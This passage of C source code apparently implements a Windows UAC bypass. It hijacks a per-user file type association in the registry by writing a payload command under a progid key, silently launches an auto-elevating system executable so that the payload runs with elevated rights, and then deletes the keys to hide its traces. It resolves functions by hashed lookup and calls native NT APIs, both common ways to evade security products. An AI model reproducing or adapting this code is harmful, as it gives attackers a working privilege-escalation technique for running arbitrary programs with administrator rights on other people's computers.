    api.NtOpenKey(&hRoot, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oaRoot);
    
	UNICODE_STRING ustr;
    InitUnicodeString(&ustr, shell32_dll);
	
	api.hShell32 = NULL;
    LdrLoadDll(NULL, 0, &ustr, (PHANDLE)&api.hShell32);
	
    if (!SetFTA(&api, hRoot, progid, mswinstore))
    {
        api.NtClose(hRoot);
        return result;
    }
    
    size_t rootLen2 = rootLen + wlen_(pre);
    
    wchar_t rootPath2[rootLen2];
    
    size_t n = 0;
    wcopy_(rootPath2, reguser, &n);
    wcopy_(rootPath2, api.sid, &n);
    wcopy_(rootPath2, pre, &n);
    rootPath2[n] = L'\0';
    
    UNICODE_STRING usRoot2;
    OBJECT_ATTRIBUTES oaRoot2;
    HANDLE hRoot2 = NULL;
    
    InitUnicodeString(&usRoot2, rootPath2);
    InitializeObjectAttributes(&oaRoot2, &usRoot2, OBJ_CASE_INSENSITIVE, NULL, NULL);
    
    api.NtOpenKey(&hRoot2, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oaRoot2);
    
    size_t fullLen = wlen_(pre) + wlen_(progid) + wlen_(suf) + 1;
    
    wchar_t fullPath[fullLen];
    
    size_t i = 0;
    wcopy_(fullPath, pre, &i);
    wcopy_(fullPath, progid, &i);
    wcopy_(fullPath, suf, &i);
    fullPath[i] = L'\0';
	
    wchar_t* cur = fullPath;
    
    while (*cur)
    {
        const wchar_t* p = pre;
        wchar_t* t = cur;
    
        while (*t && *p && *t == *p)
            ++t, ++p;
    
        if (!*p)
        {
            cur += wlen_(pre);
            break;
        }
    
        ++cur;
    }

    HANDLE hKey = hRoot2;

    while (*cur)
    {
        while (*cur == L'\\')
            ++cur;

        if (!*cur)
            break;

        wchar_t* start = cur;

        while (*cur && *cur != L'\\')
            ++cur;

        size_t segLen = (size_t)(cur - start);

        wchar_t tmp[segLen + 1];

        for (size_t j = 0; j < segLen; ++j)
            tmp[j] = start[j];

        tmp[segLen] = L'\0';

        UNICODE_STRING us;
        OBJECT_ATTRIBUTES oa;
        HANDLE hNew = NULL;

        InitUnicodeString(&us, tmp);

        InitializeObjectAttributes(&oa, &us, OBJ_CASE_INSENSITIVE, hKey, NULL);

        api.NtCreateKey(&hNew, KEY_SET_VALUE | KEY_QUERY_VALUE | DELETE, &oa, 0, NULL, REG_OPTION_NON_VOLATILE, NULL);

        if (hKey != hRoot2)
            api.NtClose(hKey);
		
        hKey = hNew;
    }

    size_t len = wlen_(payloadCmd);

    wchar_t value[len + 1];

    for (size_t j = 0; j <= len; ++j)
        value[j] = payloadCmd[j];

    UNICODE_STRING vn = { 0 };

    NTSTATUS status = api.NtSetValueKey(hKey, &vn, 0, REG_SZ, value, (ULONG)((len + 1) * sizeof(wchar_t)));

    api.NtClose(hKey);

    if (!NT_SUCCESS(status)) 
	{
        delete_registry_tree(&api, hRoot, assoc);
        api.NtClose(hRoot);
		return result;
    }

    WCHAR* windir = (WCHAR*)(((BYTE*)0x7FFE0000) + 0x030); // NtSystemRoot

    size_t windir_len = wlen_(windir);
    size_t autoele_len = wlen_(autoele_exe);

    WCHAR exePath[windir_len + autoele_len + 1];

    size_t k = 0;

    wcopy_(exePath, windir, &k);
    wcopy_(exePath, autoele_exe, &k);
    exePath[k] = L'\0';

    ShellExecuteExW_t ShellExecuteExW = (ShellExecuteExW_t)myGetProcAddressH(api.hShell32, shellexecuteexw);

    SHELLEXECUTEINFOW sei = { 0 };
    sei.cbSize = sizeof(sei);
    sei.fMask = SEE_MASK_NOCLOSEPROCESS;
    sei.lpVerb = open;
    sei.lpFile = exePath;
    sei.nShow = SW_HIDE;

    if (ShellExecuteExW(&sei))
	{
		result = 1;
        NtWaitForSingleObject(sei.hProcess, FALSE, NULL);
        api.NtClose(sei.hProcess);
    }

    delete_registry_tree(&api, hRoot2, progid);
    api.NtClose(hRoot2);

    delete_registry_tree(&api, hRoot, assoc);
    api.NtClose(hRoot);

    return result;
}

#endif // MSSTOREFTA_H
